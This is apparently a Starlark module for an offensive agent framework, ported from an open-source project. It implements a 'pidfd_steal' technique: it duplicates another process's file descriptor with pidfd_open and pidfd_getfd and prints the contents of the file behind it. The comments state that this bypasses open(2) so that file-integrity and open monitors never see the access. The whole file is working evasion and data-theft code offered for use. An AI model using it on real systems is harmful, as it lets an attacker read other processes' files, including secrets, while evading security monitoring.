# pidfd_steal - read a file another process has open, without opening it.
#
# Ported to Starlark from Furtex's edrs/pidfd_steal.c and edrs/fd_steal_read.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# pidfd_open(2) + pidfd_getfd(2) duplicate a descriptor out of the target's
# table, so no open(2) fires for the path and any file-integrity/open monitor
# never sees us touch it. Requires ptrace access to the target: CAP_SYS_PTRACE,
# or the same uid with /proc/sys/kernel/yama/ptrace_scope == 0.

# AT_FDCWD is unused here; kept for symmetry with the other host modules.
AT_FDCWD = -100


def _is_special(target):
    # A read on a pipe/socket/device can block forever, which would hang the
    # agent. Only regular-looking paths are read; anything else is reported and
    # skipped.
    if not target or target == "[]":
        return True
    for prefix in ("socket:", "pipe:", "anon_inode:", "/dev/", "/proc/", "/sys/"):
        if str_startswith(target, prefix):
            return True
    return False


def _steal(pid, fd, cap):
    pidfd_res = sys_call("pidfd_open", pid, 0)
    if pidfd_res["errno"] != 0:
        print(sprintf("[!] pidfd_open(%d) failed (errno=%d)", pid, pidfd_res["errno"]))
        return sprintf("ERROR: pidfd_open errno=%d", pidfd_res["errno"])
    pidfd = pidfd_res["r1"]

    dup_res = sys_call("pidfd_getfd", pidfd, fd, 0)
    sys_call("close", pidfd)
    if dup_res["errno"] != 0:
        print(sprintf("[!] pidfd_getfd(%d) failed (errno=%d; needs CAP_SYS_PTRACE or same-uid ptrace_scope=0)", fd, dup_res["errno"]))
        return sprintf("ERROR: pidfd_getfd errno=%d", dup_res["errno"])
    newfd = dup_res["r1"]

    target = read_link(sprintf("/proc/%d/fd/%d", pid, fd), default="")
    print(sprintf("[*] pid=%d fd=%d -> %s", pid, fd, target or "?"))
    if _is_special(target):
        sys_call("close", newfd)
        print("[!] target is not a regular file; refusing a blocking read")
        return "SKIP: non-regular target"

    buf = sys_alloc(cap)
    read_res = sys_call("read", newfd, buf, cap)
    sys_call("close", newfd)
    if read_res["errno"] != 0 or read_res["r1"] <= 0:
        sys_free(buf)
        print(sprintf("[!] read of stolen fd failed (errno=%d)", read_res["errno"]))
        return sprintf("ERROR: read errno=%d", read_res["errno"])

    n = read_res["r1"]
    data = read_cstring(buf, cap)
    sys_free(buf)
    print(sprintf("--- %d bytes (cap %d) ---", n, cap))
    print(data)
    return "OK"


def main(*args):
    pid = ""
    fd = ""
    cap = 65536
    if args and args[0]:
        pid = args[0].strip()
    if len(args) > 1 and args[1]:
        fd = args[1].strip()
    if len(args) > 2 and args[2]:
        cap = int(args[2])

    if not pid or not fd:
        print("[!] pid and fd are required")
        return "ERROR: pid and fd required"
    if cap <= 0:
        cap = 65536

    return _steal(int(pid), int(fd), cap)
